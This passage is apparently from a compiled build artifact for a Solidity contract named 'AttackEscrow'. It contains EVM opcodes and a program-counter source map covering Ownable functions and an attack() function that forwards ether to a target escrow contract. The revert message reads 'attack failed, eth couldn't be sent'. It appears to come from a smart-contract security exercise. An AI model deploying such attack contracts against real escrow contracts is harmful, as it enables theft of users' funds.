DUP2 EQ PUSH2 0x30C JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x311 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x373 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x23 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x61747461636B206661696C65642C2065746820636F756C646E27742062652073 PUSH1 0x44 DUP3 ADD MSTORE PUSH3 0x195B9D PUSH1 0xEA SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x380 PUSH2 0x3F1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH2 0x3E5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x26 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A206E6577206F776E657220697320746865207A65726F2061 PUSH1 0x44 DUP3 ADD MSTORE PUSH6 0x646472657373 PUSH1 0xD0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x36A JUMP JUMPDEST PUSH2 0x3EE DUP2 PUSH2 0x44B JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xCC JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x36A JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT DUP4 AND DUP2 OR DUP5 SSTORE PUSH1 0x40 MLOAD SWAP2 SWAP1 SWAP3 AND SWAP3 DUP4 SWAP2 PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 SWAP2 SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x4AD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x4C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x4DD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP3 MSTORE 0xA5 PUSH26 0xE57F3D0FE659215785980412FAAD3913A8CAC69397680ADDB405 DUP7 DUP4 PUSH5 0x736F6C6343 STOP ADDMOD SGT STOP CALLER ",
  "pcMap": {
    "0": {
      "offset": [
        677,
        1483
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x80"
    },
    "2": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "4": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "MSTORE",
      "path": "22"
    },
    "5": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x4"
    },
    "7": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "CALLDATASIZE",
      "path": "22"
    },
    "8": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "LT",
      "path": "22"
    },
    "9": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x43"
    },
    "12": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "13": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "15": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "CALLDATALOAD",
      "path": "22"
    },
    "16": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0xE0"
    },
    "18": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "SHR",
      "path": "22"
    },
    "19": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "DUP1",
      "path": "22"
    },
    "20": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH4",
      "path": "22",
      "value": "0x715018A6"
    },
    "25": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "EQ",
      "path": "22"
    },
    "26": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x4F"
    },
    "29": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "30": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "DUP1",
      "path": "22"
    },
    "31": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH4",
      "path": "22",
      "value": "0x8DA5CB5B"
    },
    "36": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "EQ",
      "path": "22"
    },
    "37": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x66"
    },
    "40": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "41": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "DUP1",
      "path": "22"
    },
    "42": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH4",
      "path": "22",
      "value": "0x9E5FAAFC"
    },
    "47": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "EQ",
      "path": "22"
    },
    "48": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x92"
    },
    "51": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "52": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "DUP1",
      "path": "22"
    },
    "53": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH4",
      "path": "22",
      "value": "0xF2FDE38B"
    },
    "58": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "EQ",
      "path": "22"
    },
    "59": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x9A"
    },
    "62": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "63": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "65": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "DUP1",
      "path": "22"
    },
    "66": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "REVERT",
      "path": "22"
    },
    "67": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "68": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "CALLDATASIZE",
      "path": "22"
    },
    "69": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x4A"
    },
    "72": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "73": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "STOP",
      "path": "22"
    },
    "74": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "75": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "77": {
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "DUP1",
      "path": "22"
    },
    "78": {
      "first_revert": true,
      "fn": null,
      "offset": [
        677,
        1483
      ],
      "op": "REVERT",
      "path": "22"
    },
    "79": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "80": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "CALLVALUE",
      "path": "0"
    },
    "81": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "DUP1",
      "path": "0"
    },
    "82": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "83": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x5B"
    },
    "86": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "87": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "89": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "DUP1",
      "path": "0"
    },
    "90": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "REVERT",
      "path": "0"
    },
    "91": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "92": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "POP",
      "path": "0"
    },
    "93": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x64"
    },
    "96": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xBA"
    },
    "99": {
      "fn": "Ownable.renounceOwnership",
      "jump": "i",
      "offset": [
        1831,
        1932
      ],
      "op": "JUMP",
      "path": "0"
    },
    "100": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "101": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "STOP",
      "path": "0"
    },
    "102": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "103": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "CALLVALUE",
      "path": "0"
    },
    "104": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "DUP1",
      "path": "0"
    },
    "105": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "106": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x72"
    },
    "109": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "110": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "112": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "DUP1",
      "path": "0"
    },
    "113": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "REVERT",
      "path": "0"
    },
    "114": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "115": {
      "op": "POP"
    },
    "116": {
      "fn": "Ownable.owner",
      "offset": [
        1247,
        1254
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "118": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SLOAD",
      "path": "0",
      "statement": 0
    },
    "119": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "121": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "DUP1",
      "path": "0"
    },
    "122": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "123": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "125": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "127": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "129": {
      "op": "SHL"
    },
    "130": {
      "op": "SUB"
    },
    "131": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "132": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "133": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "AND",
      "path": "0"
    },
    "134": {
      "op": "DUP3"
    },
    "135": {
      "op": "MSTORE"
    },
    "136": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "137": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "138": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "DUP2",
      "path": "0"
    },
    "139": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "140": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "SUB",
      "path": "0"
    },
    "141": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "143": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "ADD",
      "path": "0"
    },
    "144": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "145": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "RETURN",
      "path": "0"
    },
    "146": {
      "fn": "AttackEscrow.attack",
      "offset": [
        921,
        1446
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "147": {
      "fn": "AttackEscrow.attack",
      "offset": [
        921,
        1446
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x64"
    },
    "150": {
      "fn": "AttackEscrow.attack",
      "offset": [
        921,
        1446
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0xCE"
    },
    "153": {
      "fn": "AttackEscrow.attack",
      "jump": "i",
      "offset": [
        921,
        1446
      ],
      "op": "JUMP",
      "path": "22"
    },
    "154": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "155": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "CALLVALUE",
      "path": "0"
    },
    "156": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "DUP1",
      "path": "0"
    },
    "157": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "158": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xA6"
    },
    "161": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "162": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "164": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "DUP1",
      "path": "0"
    },
    "165": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "REVERT",
      "path": "0"
    },
    "166": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "167": {
      "op": "POP"
    },
    "168": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x64"
    },
    "171": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xB5"
    },
    "174": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "175": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "177": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x49B"
    },
    "180": {
      "fn": "Ownable.transferOwnership",
      "jump": "i",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMP",
      "path": "0"
    },
    "181": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "182": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x378"
    },
    "185": {
      "fn": "Ownable.transferOwnership",
      "jump": "i",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMP",
      "path": "0"
    },
    "186": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "187": {
      "offset": [
        1094,
        1107
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xC2"
    },
    "190": {
      "offset": [
        1094,
        1105
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3F1"
    },
    "193": {
      "jump": "i",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMP",
      "path": "0"
    },
    "194": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "195": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1895,
        1925
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 1,
      "value": "0xCC"
    },
    "198": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1922,
        1923
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "200": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1895,
        1913
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x44B"
    },
    "203": {
      "fn": "Ownable.renounceOwnership",
      "jump": "i",
      "offset": [
        1895,
        1925
      ],
      "op": "JUMP",
      "path": "0"
    },
    "204": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1895,
        1925
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "205": {
      "fn": "Ownable.renounceOwnership",
      "jump": "o",
      "offset": [
        1831,
        1932
      ],
      "op": "JUMP",
      "path": "0"
    },
    "206": {
      "fn": "AttackEscrow.attack",
      "offset": [
        921,
        1446
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "207": {
      "offset": [
        1094,
        1107
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD6"
    },
    "210": {
      "offset": [
        1094,
        1105
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3F1"
    },
    "213": {
      "jump": "i",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMP",
      "path": "0"
    },
    "214": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "215": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "PUSH1",
      "path": "22",
      "statement": 2,
      "value": "0x40"
    },
    "217": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "218": {
      "op": "PUSH4",
      "value": "0x610CD7F7"
    },
    "223": {
      "op": "PUSH1",
      "value": "0xE1"
    },
    "225": {
      "op": "SHL"
    },
    "226": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP2",
      "path": "22"
    },
    "227": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "MSTORE",
      "path": "22"
    },
    "228": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1019,
        1023
      ],
      "op": "ADDRESS",
      "path": "22"
    },
    "229": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x4"
    },
    "231": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP3",
      "path": "22"
    },
    "232": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "ADD",
      "path": "22"
    },
    "233": {
      "op": "MSTORE"
    },
    "234": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1026,
        1027
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "236": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "238": {
      "op": "DUP3"
    },
    "239": {
      "op": "ADD"
    },
    "240": {
      "op": "MSTORE"
    },
    "241": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        982
      ],
      "op": "PUSH32",
      "path": "22",
      "value": "0x0"
    },
    "274": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "276": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "278": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "280": {
      "op": "SHL"
    },
    "281": {
      "op": "SUB"
    },
    "282": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        992
      ],
      "op": "AND",
      "path": "22"
    },
    "283": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        992
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "284": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        992
      ],
      "op": "PUSH4",
      "path": "22",
      "value": "0xC219AFEE"
    },
    "289": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        992
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "290": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1000,
        1009
      ],
      "op": "CALLVALUE",
      "path": "22"
    },
    "291": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1000,
        1009
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "292": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "294": {
      "op": "ADD"
    },
    "295": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "297": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "299": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "300": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP1",
      "path": "22"
    },
    "301": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP4",
      "path": "22"
    },
    "302": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "SUB",
      "path": "22"
    },
    "303": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP2",
      "path": "22"
    },
    "304": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP6",
      "path": "22"
    },
    "305": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP9",
      "path": "22"
    },
    "306": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP1",
      "path": "22"
    },
    "307": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "EXTCODESIZE",
      "path": "22"
    },
    "308": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "ISZERO",
      "path": "22"
    },
    "309": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP1",
      "path": "22"
    },
    "310": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "ISZERO",
      "path": "22"
    },
    "311": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x13F"
    },
    "314": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "315": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "317": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP1",
      "path": "22"
    },
    "318": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "REVERT",
      "path": "22"
    },
    "319": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "320": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "POP",
      "path": "22"
    },
    "321": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "GAS",
      "path": "22"
    },
    "322": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "CALL",
      "path": "22"
    },
    "323": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "ISZERO",
      "path": "22"
    },
    "324": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP1",
      "path": "22"
    },
    "325": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "ISZERO",
      "path": "22"
    },
    "326": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x153"
    },
    "329": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "JUMPI",
      "path": "22"
    },
    "330": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "RETURNDATASIZE",
      "path": "22"
    },
    "331": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "333": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "DUP1",
      "path": "22"
    },
    "334": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "RETURNDATACOPY",
      "path": "22"
    },
    "335": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "RETURNDATASIZE",
      "path": "22"
    },
    "336": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "338": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "REVERT",
      "path": "22"
    },
    "339": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "340": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "POP",
      "path": "22"
    },
    "341": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "POP",
      "path": "22"
    },
    "342": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "POP",
      "path": "22"
    },
    "343": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "POP",
      "path": "22"
    },
    "344": {
      "fn": "AttackEscrow.attack",
      "offset": [
        976,
        1028
      ],
      "op": "POP",
      "path": "22"
    },
    "345": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1039,
        1054
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "347": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1057,
        1060
      ],
      "op": "PUSH32",
      "path": "22",
      "value": "0x0"
    },
    "380": {
      "op": "PUSH1",
      "value": "0x1"
    },
